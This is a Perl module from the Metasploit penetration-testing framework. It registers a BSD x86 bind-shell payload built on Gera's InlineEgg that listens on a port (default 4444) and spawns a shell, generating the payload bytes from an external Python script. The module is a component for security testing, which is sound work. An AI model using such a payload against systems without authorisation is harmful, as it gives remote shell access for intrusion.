
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Payload::bsdx86_bind_ie;
use strict;
use base 'Msf::PayloadComponent::InlineEggPayload';
sub load {
  Msf::PayloadComponent::InlineEggPayload->import('Msf::PayloadComponent::BindConnection');
}

my $info =
{
  'Name'         => 'Gera\'s InlineEgg x86 BSD bind',
  'Version'      => '$Revision$',
  'Description'  => 'Listen for connection and spawn a shell',
  'Authors'      => [ 'gera[at]corest.com [InlineEgg License]', ],
  'Arch'         => [ 'x86' ],
  'Priv'         => 0,
  'OS'           => [ 'bsd' ],
  'Size'         => 0,
};

sub new {
  load();
  my $class = shift;
  my $hash = @_ ? shift : { };
  $hash = $class->MergeHashRec($hash, {'Info' => $info});
  my $self = $class->SUPER::new($hash, @_);

  $self->{'Filename'} = $self->ScriptBase . '/payloads/external/bsdx86bind_ie.py';
  $self->_Info->{'Size'} = $self->_GenSize;
  return($self);
}

sub _GenSize {
  my $self = shift;
  my $bin = $self->Generate({'LPORT' => '4444',});
  return(length($bin));
}

1;
